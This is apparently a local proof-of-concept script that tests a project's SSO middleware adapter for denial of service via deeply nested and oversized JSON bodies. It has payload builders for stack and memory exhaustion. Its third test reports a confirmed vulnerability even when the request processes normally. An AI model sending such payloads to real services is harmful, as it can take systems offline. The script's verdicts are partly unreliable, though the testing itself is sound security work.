#!/usr/bin/env python3
"""
DoS vulnerability reproduction script for SSOMiddlewareAdapter.
This script demonstrates how deeply nested or large JSON payloads can cause
stack overflow or memory exhaustion in sso_middleware_adapter.py.
"""

import json
import sys
import time
from pathlib import Path

# Add the src directory to the path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from starlette.requests import Request
from starlette.responses import Response
from src.core.app.middleware.sso_middleware_adapter import SSOMiddlewareAdapter
from src.core.auth.sso.middleware import AuthMiddleware


class MockAuthMiddleware(AuthMiddleware):
    """Mock auth middleware for testing."""
    
    async def __call__(self, request_dict: dict) -> dict | None:
        return None  # Always allow (for testing)


def create_deeply_nested_json(depth: int) -> dict:
    """Create a JSON structure with specified nesting depth."""
    if depth == 0:
        return {"value": "leaf"}
    return {"nested": create_deeply_nested_json(depth - 1)}


def create_large_array_json(size: int) -> dict:
    """Create a JSON structure with a large array."""
    return {"messages": [{"role": "user", "content": "test"}] * size}


async def test_deep_nesting_attack():
    """Test stack overflow attack via deeply nested JSON."""
    print("=" * 60)
    print("TEST 1: Deep Nesting Attack (Stack Overflow)")
    print("=" * 60)
    
    mock_auth = MockAuthMiddleware(None, None)  # type: ignore
    middleware = SSOMiddlewareAdapter(None, mock_auth)  # type: ignore
    
    # Test with increasing depths
    for depth in [100, 200, 500, 1000]:
        print(f"\nTesting with nesting depth: {depth}")
        
        nested_data = create_deeply_nested_json(depth)
        json_str = json.dumps(nested_data)
        json_bytes = json_str.encode("utf-8")
        
        print(f"  JSON size: {len(json_bytes)} bytes")
        print(f"  Within size limit: {len(json_bytes) <= middleware.MAX_BODY_SIZE}")
        
        # Create a mock request
        async def mock_receive():
            return {"type": "http.request", "body": json_bytes}
        
        scope = {
            "type": "http",
            "method": "POST",
            "path": "/test",
            "headers": [(b"content-type", b"application/json")],
        }
        
        request = Request(scope, mock_receive)
        
        start_time = time.time()
        try:
            result = await middleware._convert_request_to_dict(request)
            elapsed = time.time() - start_time
            
            print(f"  ✓ Processed successfully in {elapsed:.3f}s")
            print(f"  Messages extracted: {len(result.get('messages', []))}")
        except RecursionError as e:
            print(f"  ✗ RECURSION ERROR (DoS confirmed!): {e}")
            return True
        except Exception as e:
            print(f"  ✗ Error: {type(e).__name__}: {e}")
            if "recursion" in str(e).lower() or "depth" in str(e).lower():
                return True
    
    return False


async def test_large_array_attack():
    """Test memory exhaustion attack via large arrays."""
    print("\n" + "=" * 60)
    print("TEST 2: Large Array Attack (Memory Exhaustion)")
    print("=" * 60)
    
    mock_auth = MockAuthMiddleware(None, None)  # type: ignore
    middleware = SSOMiddlewareAdapter(None, mock_auth)  # type: ignore
    
    # Test with increasing array sizes
    for size in [100000, 500000, 1000000]:
        print(f"\nTesting with array size: {size:,}")
        
        large_data = create_large_array_json(size)
        json_str = json.dumps(large_data)
        json_bytes = json_str.encode("utf-8")
        
        print(f"  JSON size: {len(json_bytes) / (1024*1024):.2f} MB")
        print(f"  Within size limit: {len(json_bytes) <= middleware.MAX_BODY_SIZE}")
        
        if len(json_bytes) > middleware.MAX_BODY_SIZE:
            print(f"  ⚠ Skipping - exceeds size limit ({middleware.MAX_BODY_SIZE / (1024*1024):.2f} MB)")
            continue
        
        # Create a mock request
        async def mock_receive():
            return {"type": "http.request", "body": json_bytes}
        
        scope = {
            "type": "http",
            "method": "POST",
            "path": "/test",
            "headers": [(b"content-type", b"application/json")],
        }
        
        request = Request(scope, mock_receive)
        
        start_time = time.time()
        try:
            result = await middleware._convert_request_to_dict(request)
            elapsed = time.time() - start_time
            
            print(f"  ✓ Processed successfully in {elapsed:.3f}s")
            print(f"  Messages extracted: {len(result.get('messages', []))}")
        except MemoryError as e:
            print(f"  ✗ MEMORY ERROR (DoS confirmed!): {e}")
            return True
        except Exception as e:
            print(f"  ✗ Error: {type(e).__name__}: {e}")
            if "memory" in str(e).lower():
                return True
    
    return False


async def test_combined_attack():
    """Test combined attack with both deep nesting and large arrays."""
    print("\n" + "=" * 60)
    print("TEST 3: Combined Attack (Deep Nesting + Large Arrays)")
    print("=" * 60)
    
    mock_auth = MockAuthMiddleware(None, None)  # type: ignore
    middleware = SSOMiddlewareAdapter(None, mock_auth)  # type: ignore
    
    # Create payload with both deep nesting and large arrays
    combined_data = {
        "messages": [{"role": "user", "content": "test"}] * 50000,
        "nested": create_deeply_nested_json(200),
        "large_array": list(range(100000)),
    }
    
    json_str = json.dumps(combined_data)
    json_bytes = json_str.encode("utf-8")
    
    print(f"JSON size: {len(json_bytes) / (1024*1024):.2f} MB")
    print(f"Within size limit: {len(json_bytes) <= middleware.MAX_BODY_SIZE}")
    
    if len(json_bytes) > middleware.MAX_BODY_SIZE:
        print("⚠ Skipping - exceeds size limit")
        return False
    
    # Create a mock request
    async def mock_receive():
        return {"type": "http.request", "body": json_bytes}
    
    scope = {
        "type": "http",
        "method": "POST",
        "path": "/test",
        "headers": [(b"content-type", b"application/json")],
    }
    
    request = Request(scope, mock_receive)
    
    start_time = time.time()
    try:
        result = await middleware._convert_request_to_dict(request)
        elapsed = time.time() - start_time
        
        print(f"✓ Processed successfully in {elapsed:.3f}s")
        print(f"Messages extracted: {len(result.get('messages', []))}")
        print("⚠ WARNING: Combined attack succeeded - vulnerability confirmed!")
        return True
    except (RecursionError, MemoryError) as e:
        print(f"✗ ERROR (DoS confirmed!): {type(e).__name__}: {e}")
        return True
    except Exception as e:
        print(f"✗ Error: {type(e).__name__}: {e}")
        return True


if __name__ == "__main__":
    import asyncio
    
    print("DoS Vulnerability Test: SSOMiddlewareAdapter")
    print("=" * 60)
    print("This script tests for DoS vulnerabilities in sso_middleware_adapter.py")
    print("by attempting to exploit JSON parsing without depth/array limits.\n")
    
    vulnerabilities_found = []
    
    if asyncio.run(test_deep_nesting_attack()):
        vulnerabilities_found.append("Deep nesting (stack overflow)")
    
    if asyncio.run(test_large_array_attack()):
        vulnerabilities_found.append("Large arrays (memory exhaustion)")
    
    if asyncio.run(test_combined_attack()):
        vulnerabilities_found.append("Combined attack")
    
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    
    if vulnerabilities_found:
        print("⚠ VULNERABILITIES CONFIRMED:")
        for vuln in vulnerabilities_found:
            print(f"  - {vuln}")
        print("\nThe SSOMiddlewareAdapter is vulnerable to DoS attacks via:")
        print("  1. Deeply nested JSON causing stack overflow")
        print("  2. Large arrays causing memory exhaustion")
        print("  3. Combined attacks using both techniques")
        print("\nNote: Size limit exists but doesn't prevent depth/array attacks!")
        sys.exit(1)
    else:
        print("✓ No obvious vulnerabilities detected in this test.")
        print("  (Note: This doesn't guarantee security - manual review recommended)")
        sys.exit(0)

